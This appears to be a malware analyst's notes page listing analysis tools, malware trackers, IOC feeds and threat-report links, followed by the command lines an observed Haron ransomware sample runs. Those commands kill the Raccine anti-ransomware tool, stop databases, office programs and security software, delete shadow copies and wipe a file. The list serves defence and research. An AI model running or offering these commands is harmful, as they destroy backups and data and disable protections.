

wireshark columns: https://pastebin.com/LsQzcrTD
wireshark filters: https://pastebin.com/2SE6q5uh
 
Online tools:
Great decoder: https://gchq.github.io/CyberChef/
Office Doc Dropper Analysis: https://malware.sekoia.fr/new
Office Doc Analysis: https://iris-h.malwageddon.com/submit
 
Trackers:
http://tracker.h3x.eu/families
https://ransomwaretracker.abuse.ch/tracker/
http://benkow.cc/passwords.php
http://cybercrime-tracker.net/
https://urlhaus.abuse.ch/
 
IOC feeds:
https://www.hashdd.com/hashdd/twitter-hashddbot/
http://tweettioc.com/
 
Other
Dumping from start to finish:  https://twitter.com/James_inthe_box/status/1187784553940701184
Getting the ursnif goods:  https://twitter.com/James_inthe_box/status/1153778075697631232




How to pro








Resources 




https://thedfirreport.com/2020/11/12/cryptominers-exploiting-weblogic-rce-cve-2020-14882/

https://www.trendmicro.com/en_us/research/21/d/tor-based-botnet-malware-targets-linux-systems-abuses-cloud-management-tools.html

https://blog.talosintelligence.com/2018/08/rocke-champion-of-monero-miners.html

https://blog.talosintelligence.com/2020/01/vivin-cryptomining-campaigns.html

https://blog.trendmicro.com/trendlabs-security-intelligence/fileless-cryptocurrency-miner-ghostminer-weaponizes-wmi-objects-kills-other-cryptocurrency-mining-payloads/

https://github.com/guardicore/labs_campaigns/blob/master/Nansh0u/mining_pools_domains.md












Haron Ransomware Command Lines
https://pastebin.com/u/pandazheng




 "taskkill" /F /IM RaccineSettings.exe 
 "reg" delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Raccine Tray" /F 
 "reg" delete HKCU\Software\Raccine /F 
 "schtasks" /DELETE /TN "Raccine Rules Updater" /F 
 "sc.exe" config Dnscache start= auto 
 "sc.exe" config SQLTELEMETRY start= disabled 
 "sc.exe" config FDResPub start= auto 
 "sc.exe" config SSDPSRV start= auto 
 "sc.exe" config SQLWriter start= disabled 
 "cmd.exe" /c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin 
 "sc.exe" config SQLTELEMETRY$ECWDB2 start= disabled 
 "sc.exe" config upnphost start= auto 
 "sc.exe" config SstpSvc start= disabled 
 "taskkill.exe" /IM mspub.exe /F 
 "taskkill.exe" /IM mydesktopqos.exe /F 
 "taskkill.exe" /IM xfssvccon.exe /F 
 "taskkill.exe" /IM CNTAoSMgr.exe /F 
 "taskkill.exe" /IM sqlbrowser.exe /F 
 "taskkill.exe" /IM mydesktopqos.exe /F 
 "taskkill.exe" /IM visio.exe /F 
 "taskkill.exe" /IM sqlwriter.exe /F 
 "taskkill.exe" /IM mspub.exe /F 
 "taskkill.exe" /IM sqlservr.exe /F 
 "taskkill.exe" /IM mydesktopservice.exe /F 
 "taskkill.exe" /IM synctime.exe /F 
 "taskkill.exe" /IM tbirdconfig.exe /F 
 "taskkill.exe" /IM mydesktopservice.exe /F 
 "taskkill.exe" /IM Ntrtscan.exe /F 
 "taskkill.exe" /IM mysqld.exe /F 
 "taskkill.exe" /IM winword.exe /F 
 "taskkill.exe" /IM isqlplussvc.exe /F 
 "taskkill.exe" /IM thebat.exe /F 
 "taskkill.exe" /IM dbeng50.exe /F 
 "taskkill.exe" /IM onenote.exe /F 
 "taskkill.exe" /IM thebat64.exe /F 
 "taskkill.exe" /IM sqbcoreservice.exe /F 
 "taskkill.exe" /IM steam.exe /F 
 "taskkill.exe" /IM mysqld-nt.exe /F 
 "taskkill.exe" /IM PccNTMon.exe /F 
 "taskkill.exe" /IM encsvc.exe /F 
 "taskkill.exe" /IM ocomm.exe /F 
 "taskkill.exe" /IM firefoxconfig.exe /F 
 "taskkill.exe" /IM wordpad.exe /F 
 "taskkill.exe" /IM msaccess.exe /F 
 "taskkill.exe" /IM agntsvc.exe /F 
 "taskkill.exe" /IM mysqld-opt.exe /F 
 "taskkill.exe" /IM excel.exe /F 
 "taskkill.exe" /IM infopath.exe /F 
 "taskkill.exe" /IM mbamtray.exe /F 
 "taskkill.exe" /IM outlook.exe /F 
 "taskkill.exe" /IM ocautoupds.exe /F 
 "taskkill.exe" /IM zoolz.exe /F 
 "taskkill.exe" /IM tmlisten.exe /F 
 "taskkill.exe" /IM ocssd.exe /F 
 "taskkill.exe" /IM ocssd.exe /F 
 "taskkill.exe" /IM msftesql.exe /F 
 "taskkill.exe" /IM oracle.exe /F 
 "taskkill.exe" /IM oracle.exe /F 
 "taskkill.exe" /IM powerpnt.exe /F 
 "taskkill.exe" /IM sqlagent.exe /F 
 "powershell.exe" & Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_Delete(); } 

     "cmd.exe" /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 �%s� & Del /f /q �%s� 

